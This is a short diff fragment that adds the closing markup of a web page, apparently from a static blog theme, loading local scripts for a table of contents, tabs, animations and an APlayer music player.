+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+    <div id="aplayer"></div>
+
+<script src="/js/libs/APlayer.min.js"></script>
+
+
+<script src="/js/plugins/aplayer.js"></script>
+
+
+</body>
+</html>
